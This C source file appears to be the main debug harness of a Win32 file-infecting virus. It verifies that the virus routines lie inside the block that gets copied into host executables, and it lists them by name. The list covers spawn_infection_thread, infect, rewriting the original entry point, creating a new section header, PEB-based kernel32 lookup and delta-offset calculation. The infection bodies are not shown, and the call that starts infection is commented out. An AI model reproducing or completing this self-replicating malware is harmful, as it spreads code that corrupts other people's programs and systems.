#include <stdio.h>
#include <windows.h>

#include "checksum.h"
#include "code_begin.h"
#include "code_end.h"
#include "delta.h"
#include "disasm/analysis/analysis.h"
#include "disasm/analysis/block.h"
#include "disasm/analysis/call.h"
#include "disasm/analysis/function.h"
#include "disasm/disasm.h"
#include "function_kernel32.h"
#include "infect.h"
#include "infection_thread.h"
#include "memory.h"
#include "oep.h"
#include "pe.h"
#include "process_info.h"
#include "string_generator.h"
#include "utility.h"

#ifdef _WIN64
#error "Currently only support Win32"
#endif

#define IN_BOUNDARIES(f)                                                       \
    ((void *)f >= (void *)code_begin && (void *)f < (void *)code_end)

static uint8_t check_functions(void);
static const char *get_function_name(void *addr);

// main function is not copied during infection, so can use any external
// function here
int main(int argc, char **argv) {
    if (!IS_32_BIT) {
        PRINT_DEBUG("Not 32 bit, aborting");
        return 1;
    }

    PRINT_DEBUG("bit_width: %d", IS_32_BIT ? 32 : IS_64_BIT ? 64 : 0);
    PRINT_DEBUG("code_begin: 0x%p", code_begin);
    PRINT_DEBUG("code_end: 0x%p", code_end);
    PRINT_DEBUG("code_size: %.2fkiB",
                (float)BYTE_DIFF(code_end, code_begin) / 1024.);
    uint8_t sane_function_locations = check_functions();
    PRINT_DEBUG("sane function locations: %s",
                sane_function_locations ? "yes" : "no");
    if (!sane_function_locations) {
        PRINT_DEBUG("function locations not sane, aborting");
        return 2;
    }

    void *entrypoints[] = {(void *)spawn_infection_thread,
                           (void *)infection_thread};

    CodeAnalysis *analysis =
        analyze_code(entrypoints, 2, (void *)code_begin, (void *)code_end);
    for (FunctionList *fl = analysis->function_list; fl != NULL;
         fl = fl->next) {
        PRINT_DEBUG("Found function: 0x%p -> %s", fl->function->entrypoint,
                    get_function_name(fl->function->entrypoint));
    }

    // spawn_infection_thread();
    fgetc(stdin);
    return 0;
}

static uint8_t check_functions(void) {
    return !IN_BOUNDARIES(main) && !IN_BOUNDARIES(check_functions) &&
           IN_BOUNDARIES(get_string) && IN_BOUNDARIES(get_string_length) &&
           IN_BOUNDARIES(checksum) && IN_BOUNDARIES(spawn_infection_thread) &&
           IN_BOUNDARIES(infect) && IN_BOUNDARIES(get_original_entry_point) &&
           IN_BOUNDARIES(write_original_entry_point) && IN_BOUNDARIES(is_pe) &&
           IN_BOUNDARIES(align_value) && IN_BOUNDARIES(get_nt_header) &&
           IN_BOUNDARIES(get_section_header) &&
           IN_BOUNDARIES(get_last_section_header) &&
           IN_BOUNDARIES(get_export_directory) &&
           IN_BOUNDARIES(is_section_header_empty) &&
           IN_BOUNDARIES(create_section_header) && IN_BOUNDARIES(get_teb) &&
           IN_BOUNDARIES(get_peb) && IN_BOUNDARIES(get_image_base) &&
           IN_BOUNDARIES(get_kernel32_base) &&
           IN_BOUNDARIES(get_delta_offset) && IN_BOUNDARIES(memzero) &&
           IN_BOUNDARIES(memcp) && IN_BOUNDARIES(same_case_insensitive) &&
           IN_BOUNDARIES(get_function_pointer) && IN_BOUNDARIES(setup_disasm) &&
           IN_BOUNDARIES(set_next_address) &&
           IN_BOUNDARIES(get_current_instruction_size);
}

static const char *get_function_name(void *addr) {

    if (addr == get_string)
        return "get_string";
    else if (addr == get_function_pointer)
        return "get_function_pointer";
    else if (addr == get_string_length)
        return "get_string_length";
    else if (addr == setup_disasm)
        return "setup_disasm";
    else if (addr == set_next_address)
        return "set_next_address";
    else if (addr == get_current_instruction_size)
        return "get_current_instruction_size";
    else if (addr == infect)
        return "infect";
    else if (addr == checksum)
        return "checksum";
    else if (addr == spawn_infection_thread)
        return "spawn_infection_thread";
    else if (addr == get_original_entry_point)
        return "get_original_entry_point";
    else if (addr == write_original_entry_point)
        return "write_original_entry_point";
    else if (addr == is_pe)
        return "is_pe";
    else if (addr == align_value)
        return "align_value";
    else if (addr == get_section_header)
        return "get_section_header";
    else if (addr == get_last_section_header)
        return "get_last_section_header";
    else if (addr == get_export_directory)
        return "get_export_directory";
    else if (addr == is_section_header_empty)
        return "is_section_header_empty";
    else if (addr == create_section_header)
        return "create_section_header";
    else if (addr == get_teb)
        return "get_teb";
    else if (addr == get_peb)
        return "get_peb";
    else if (addr == get_image_base)
        return "get_image_base";
    else if (addr == get_kernel32_base)
        return "get_kernel32_base";
    else if (addr == get_delta_offset)
        return "get_delta_offset";
    else if (addr == memzero)
        return "memzero";
    else if (addr == memcp)
        return "memcp";
    else if (addr == same_case_insensitive)
        return "same_case_insensitive";
    else
        return "<UNKNOWN>";
}
